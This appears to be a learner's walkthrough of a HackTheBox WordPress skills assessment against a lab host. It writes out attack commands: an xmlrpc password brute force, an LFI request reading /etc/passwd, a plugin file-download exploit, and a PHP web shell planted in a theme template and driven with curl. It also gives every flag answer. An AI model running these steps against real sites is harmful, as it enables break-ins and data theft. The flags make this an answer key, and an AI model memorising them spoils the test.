We have reached the end of the module!

Now let's put all of the new skills we have learned into practice. This final skills assessment will test each of the topics introduced in this module against a new WordPress target.

## Scenario

You have been contracted to perform an external penetration test against the company `INLANEFREIGHT` that is hosting one of their main public-facing websites on WordPress.

Enumerate the target thoroughly using the skills learned in this module to find a variety of flags. Obtain shell access to the webserver to find the final flag.

Note: You need to have a knowledge about how in Linux DNS mapping is done when the name server is missing.



#### Questions

Identify the WordPress version number.

* First, run a command with nmap as " nmap -Pn \<ip given> ", theres an HTTP and HTTPS connection available so use any of those to open the webpage in your browser
* once you are in the page, check for all the links and buttons, where they lead to and you will fine an interesting one called " blog.inlanefreight.local ". If you try accessing it, the webpage wont resolve, so you have to add the page to your list of hosts
* Run command " sudo sh -c 'echo “10.129.2.37 blog.inlanefreight.local” >> /etc/hosts' ", make sure the hosts does not have double quotes on the host file, if it does then remove them
* You can either access the webpage now by pressing the button that would not resolve before, or run the command " curl -s -X GET http:\//blog.inlanefreight.local/ | grep '\<meta name="generator"' " 
* 5.1.6

Identify the WordPress theme in use.

* Run command " curl -s -X GET http:\//blog.inlanefreight.local/ | grep theme ", you will see the used theme in several results 
* twentynineteen

Submit the contents of the flag file in the directory with directory listing enabled.

* Run command " wpscan --enumerate ap --url http:\//blog.inlanefreight.local/ ", the output will show theres a directory listing available in the address " http:\//blog.inlanefreight.local/wp-content/uploads/ " so we will use it
* go to the webpage from the address you just got and you will see a file called "upload_flag.txt"
* HTB{d1sabl3_d1r3ct0ry_l1st1ng!}

Identify the only non-admin WordPress user. (Format: \<first-name> \<last-name>)

* Run command " wpscan --enumerate u --url http:\//blog.inlanefreight.local/ ", this will scan for users available on the page, the only user which does not have any sort of permissions is the one the scan found via brute force
* Charlie Wiggins

Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download.

*  Run command " wpscan --enumerate ap --url http:\//blog.inlanefreight.local/ ", this will scan for the vulnerable plugins the site has, we will use one in particular called " email-suscribers "
* Search on google for " CVE email-suscribers wordpress " and you will find one vulnerability in particular coded " CVE 2019-19985 " which allows for an authenticated file download
* for you to run the vulnerability, either go to a browser and type the whole link as " http:\//blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all " or do a curl, this will download a list of " subscribed users file " which you can open to get the flag
* HTB{unauTh_d0wn10ad!}

What is the version number of the plugin vulnerable to an LFI?

* Run command " wpscan --enumerate ap --url http:\//blog.inlanefreight.local/ ", theres only 2 plugins and the one you need is the first one
* 1.1.1

Use the LFI to identify a system user whose name starts with the letter "f".

* Search on google for " LFI Wordpress plugin ", it should intruct you on using the LFI by running the command " curl http:\//blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd ", it will give you a list of users in the webpage server, then just look for the one that starts with " f "
* frank.mclane

Obtain a shell on the system and submit the contents of the flag in the /home/erika directory.

* Run command " sudo wpscan --password-attack xmlrpc -t 20 -U erika -P rockyou.txt --url http:\//blog.inlanefreight.local ", we can do an xmlrpc attack as shown previously from our wpscans, the question is asking us to do an attack on an user called " erika " and we should use the " rockyou.txt " file as its a long and useful list of popular passwords
* Once you get a positive result, you wull notice the password is " 010203 " and we will use it to access the webpages admin page. Once there, we should change the actual webpage theme for an obsolete one, such as the " Twenty Seventeen " as shown in previous examples.
* Once changed, co to the " Theme editor " tab and save the " system($\_GET\['cmd']); " code into the 404 template as done in previous exercises
* Once saved, you can run the command "curl http:\//blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls+/home/erika/ " and you will notice the flag has an unusual name which is " d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt "
* Run command " curl http:\//blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat+/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt " , or just go to the url on your browser to check the flags content
* HTB{w0rdPr355_4SS3ssm3n7}